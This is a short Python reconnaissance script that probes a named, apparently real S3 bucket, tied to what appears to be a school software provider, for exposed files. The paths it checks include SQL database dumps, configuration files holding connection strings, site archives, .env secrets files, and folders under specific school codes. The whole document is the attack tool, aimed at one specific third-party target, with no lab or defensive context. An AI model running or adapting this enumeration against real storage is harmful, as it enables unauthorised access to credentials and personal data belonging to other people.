# The AWS instance ID tells us region (ap-south-1 based on the bucket location)
# Try to enumerate the S3 bucket with common backup patterns
import requests

bucket = "https://jtpleconnect.s3.ap-south-1.amazonaws.com"

paths = [
    # Database backups
    "/backup.sql", "/db/backup.sql", "/database.sql", "/dump.sql",
    "/site.sql", "/data.sql", "/jupsoft_backup.sql",
    # Config files
    "/web.config", "/Web.config", "/appsettings.json", "/connectionstrings.config",
    "/wp-config.php", "/config.php",
    # Common school codes we know
    "/Worksheet", "/Worksheet/HILWOD", "/Worksheet/MAXFRT",
    "/Worksheet/HILWOD/shared_img", "/Worksheet/MAXFRT/shared_img",
    "/Worksheet/CompanyLogo",
    # Archives
    "/backup.zip", "/backup.tar.gz", "/site.zip", "/www.zip",
    "/wwwroot.zip", "/app.zip",
    # Environment files
    "/.env", "/env.txt",
]

for path in paths:
    url = bucket + path
    r = requests.head(url)
    if r.status_code == 200:
        print(f"[!] EXISTS: {url}")
